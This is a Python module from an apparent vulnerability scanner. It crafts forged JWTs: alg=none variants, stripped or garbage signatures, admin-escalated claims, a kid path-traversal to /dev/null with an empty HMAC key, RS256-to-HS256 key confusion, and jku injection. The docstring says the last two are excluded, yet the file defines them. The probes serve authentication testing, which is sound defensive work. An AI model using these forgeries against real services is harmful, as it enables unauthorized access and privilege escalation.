"""JWT forgery probes for the Broken Authentication check.

A blind scanner cannot mint a *validly signed* token for another user, but it can
test whether the server validates a token at all. Given a real bearer JWT from a
credential, we derive a small set of tampered tokens, each isolating one common
verification flaw. If a protected endpoint (one that rejects an anonymous request)
accepts any of them, that names a concrete bypass class.

Probes (all blind, no target-side secret required):

- ``alg_none`` — re-encode the header with ``alg: "none"`` and an empty
  signature. A server that honours ``none`` skips verification entirely.
- ``sig_stripped`` — keep the header/payload, drop the signature. Tests whether
  the signature is required at all.
- ``sig_tampered`` — keep header/payload, replace the signature with garbage.
  Tests whether the signature is actually verified.
- ``claims_tampered`` — flip a privilege-ish claim (``role``/``admin``/``sub``)
  and re-sign with garbage. Acceptance means neither the claim change nor the
  broken signature was caught.
- ``alg_none_case`` — ``alg: "None"`` (capitalised). A library that blocks the
  literal ``"none"`` with a string compare but lowercases the algorithm name
  afterwards still skips verification; this catches that off-by-a-case bypass.
- ``kid_empty_key`` (only when the token header carries a ``kid``) — point
  ``kid`` at a path that resolves to empty bytes (``/dev/null`` via traversal)
  and sign HS256 with an **empty key**. A server that loads the HMAC key from a
  file named by ``kid`` reads nothing and verifies our signature — a real,
  blind, no-secret-needed key-injection bypass.

We use PyJWT only to *read* the presented token (unverified header/claims);
the forged tokens are hand-encoded so PyJWT's own guards (it refuses to emit
``alg=none`` or sign with an empty key) don't get in the way.

Deliberately **not** here: RS256→HS256 key confusion (needs the server's public
key, i.e. a JWKS fetch and new outbound egress) and ``jku``/``x5u`` header
injection (only confirmable via an OAST callback). Both belong with the OOB
tier, not this blind one. Audience/issuer confusion is not forgeable blind.
Expiry and ``nbf`` probes live in ``jwt_hmac.py`` and are emitted only when a
small, time-bounded offline dictionary recovers the HMAC key, so their changed
claims carry a genuinely valid signature.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
from dataclasses import dataclass
from typing import Any

import jwt  # PyJWT

# A path that resolves to an empty file, reached from wherever a naive key
# loader joins the kid. Empty bytes become the HMAC key.
_EMPTY_KEY_PATH = "../../../../../../../../dev/null" 


@dataclass(frozen=True)
class ForgedToken:
    label: str          # bypass class, e.g. "alg_none"
    description: str     # human-readable one-liner for the finding
    token: str          # the tampered compact JWT


def _b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def _encode(header: dict[str, Any], payload: dict[str, Any], signature: str) -> str:
    h = _b64url(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}.{signature}"


def _hs256(header: dict[str, Any], payload: dict[str, Any], key: bytes) -> str:
    """A JWT whose HS256 signature over ``key`` is genuinely valid.

    Hand-rolled because PyJWT refuses an empty key, which is the whole point of
    the ``kid_empty_key`` probe.
    """
    h = _b64url(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = _b64url(hmac.new(key, signing_input, hashlib.sha256).digest())
    return f"{h}.{p}.{sig}"


def _looks_like_jwt(token: str) -> bool:
    return token.count(".") == 2 and token.startswith("ey")


def _read(token: str) -> tuple[dict[str, Any], dict[str, Any]] | None:
    """Unverified (header, payload) of a compact JWT, or None if not a JWT."""
    if not _looks_like_jwt(token):
        return None
    try:
        header = jwt.get_unverified_header(token)
        payload = jwt.decode(token, options={"verify_signature": False})
    except Exception:  # noqa: BLE001 — malformed/opaque token: not forgeable
        return None
    if not isinstance(header, dict) or not isinstance(payload, dict):
        return None
    return header, payload


def _bump_privilege(payload: dict[str, Any]) -> dict[str, Any]:
    """A copy of the claims nudged toward higher privilege, best-effort."""
    out = dict(payload)
    if "role" in out:
        out["role"] = "admin"
    if "roles" in out and isinstance(out["roles"], list):
        out["roles"] = [*out["roles"], "admin"]
    if "admin" in out:
        out["admin"] = True
    out.setdefault("admin", True)
    if "scope" in out and isinstance(out["scope"], str):
        out["scope"] = out["scope"] + " admin"
    return out


def forge_from_token(token: str) -> list[ForgedToken]:
    """Build the forgery set from a real bearer token. Empty if not a JWT."""
    read = _read(token)
    if read is None:
        return []
    header, payload = read
    none_header = {**header, "alg": "none"}
    tampered_claims = _bump_privilege(payload)

    forgeries = [
        ForgedToken(
            "alg_none",
            "a token re-signed with alg=none (empty signature) was accepted",
            _encode(none_header, payload, ""),
        ),
        ForgedToken(
            "sig_stripped",
            "a token with its signature removed was accepted",
            _encode(header, payload, ""),
        ),
        ForgedToken(
            "sig_tampered",
            "a token with an invalid (garbage) signature was accepted",
            _encode(header, payload, "aidetectorInvalidSignature"),
        ),
        ForgedToken(
            "claims_tampered",
            "a token with elevated claims and a broken signature was accepted",
            _encode(header, tampered_claims, "aidetectorInvalidSignature"),
        ),
        ForgedToken(
            "alg_none_case",
            "a token with alg='None' (capitalised) and no signature was accepted",
            _encode({**header, "alg": "None"}, payload, ""),
        ),
    ]
    if header.get("kid") is not None:
        # Only meaningful when the presented token names a key by id: the probe
        # is that the server loads that key from a kid-derived path.
        forgeries.append(
            ForgedToken(
                "kid_empty_key",
                "a token whose kid points at an empty-key file, signed with an "
                "empty HMAC key, was accepted",
                _hs256(
                    {**header, "alg": "HS256", "kid": _EMPTY_KEY_PATH}, payload, b""
                ),
            )
        )
    return forgeries


def _b64url_decode(raw: str) -> bytes:
    """base64url-decode, tolerating missing padding (JWKS ``n``/``e`` use it)."""
    return base64.urlsafe_b64decode(raw + "=" * (-len(raw) % 4))


def pem_from_jwks(jwks: dict[str, Any]) -> str | None:
    """The first RSA public key in a JWKS document, as a PEM string."""
    for key in (jwks or {}).get("keys") or []:
        if not isinstance(key, dict) or key.get("kty") != "RSA":
            continue
        n, e = key.get("n"), key.get("e")
        if not n or not e:
            continue
        try:
            from cryptography.hazmat.primitives import serialization
            from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers

            numbers = RSAPublicNumbers(
                int.from_bytes(_b64url_decode(e), "big"),
                int.from_bytes(_b64url_decode(n), "big"),
            )
            return numbers.public_key().public_bytes(
                serialization.Encoding.PEM,
                serialization.PublicFormat.SubjectPublicKeyInfo,
            ).decode()
        except Exception:  # noqa: BLE001 — malformed key: try the next
            continue
    return None


def forge_hs256_confusion(token: str, public_key_pem: str) -> ForgedToken | None:
    """Re-sign a token as HS256 using the server's RSA public key as the HMAC secret.

    The classic RS256→HS256 confusion: a library that picks its verification key
    by algorithm will HMAC the token with the public key — which the attacker
    also knows. ``None`` when the presented token is not a readable JWT.
    """
    read = _read(token)
    if read is None:
        return None
    header, payload = read
    return ForgedToken(
        "rs256_hs256_confusion",
        "a token re-signed with HS256 using the server's public key as the HMAC "
        "secret was accepted",
        _hs256({**header, "alg": "HS256"}, _bump_privilege(payload), public_key_pem.encode()),
    )


def forge_jku(token: str, jku_url: str) -> ForgedToken | None:
    """A token whose ``jku`` header points at an attacker-controlled key set.

    The signature is deliberately invalid; the signal is not acceptance but the
    server *fetching* the header URL (an SSRF via the JWT header), which an OAST
    callback confirms. ``None`` when the presented token is not a readable JWT.
    """
    read = _read(token)
    if read is None:
        return None
    header, payload = read
    return ForgedToken(
        "jku_injection",
        "a token whose jku header pointed at an attacker-controlled host was "
        "honored (the target fetched it)",
        _encode({**header, "jku": jku_url}, _bump_privilege(payload), "aidetectorInvalidSignature"),
    )
